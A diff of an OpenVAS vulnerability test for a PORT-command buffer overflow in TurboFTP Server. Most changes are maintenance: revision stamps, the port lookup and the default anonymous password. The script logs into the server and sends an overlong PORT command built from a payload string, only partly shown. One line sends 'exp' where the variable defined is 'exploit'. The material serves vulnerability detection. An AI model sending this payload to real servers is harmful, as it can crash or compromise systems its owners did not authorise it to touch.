@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_turboftp_server_port_cmd_bof_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: gb_turboftp_server_port_cmd_bof_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # TurboFTP Server PORT Command Processing Buffer Overflow Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803105");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11435 $");
   script_bugtraq_id(55764);
   script_tag(name:"cvss_base", value:"9.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-10-22 18:55:24 +0530 (Mon, 22 Oct 2012)");
   script_name("TurboFTP Server PORT Command Processing Buffer Overflow Vulnerability");
   script_xref(name:"URL", value:"http://secunia.com/advisories/50595/");
@@ -54,27 +54,18 @@ which will result in a stack-based buffer overflow.");
 For updates refer to http://www.tbsoftinc.com/download.htm");
   script_tag(name:"summary", value:"This host is running TurboFTP server and is prone to buffer
 overflow vulnerability.");
+
   exit(0);
 }
-
 
 include("ftp_func.inc");
 
-port = get_kb_item("Services/ftp");
-if(! port){
-  port = 21;
-}
-
-if(!get_port_state(port)){
-  exit(0);
-}
-
+port = get_ftp_port(default:21);
 banner = get_ftp_banner(port:port);
 if(!banner || "TurboFTP Server" >!< banner){
   exit(0);
 }
 
-## Open FTP Socket
 soc = open_sock_tcp(port);
 if(!soc){
   exit(0);
@@ -85,7 +76,7 @@ pass = get_kb_item("ftp/password");
 
 if(!user){
   user = "anonymous";
-  pass = "openvas@";
+  pass = "user@";
 }
 
 login_details = ftp_log_in(socket:soc, user:user, pass:pass);
@@ -112,7 +103,6 @@ data = "98,81,113,65,133,25,65,0,42,105,75,0,116,96,95,0,42,248,70,0,149,59," +
 
 exploit = "PORT " + data ;
 
-## Send exploit
 ftp_send_cmd(socket:soc, cmd:exp);
 
 for(i=0; i<=3; i++){
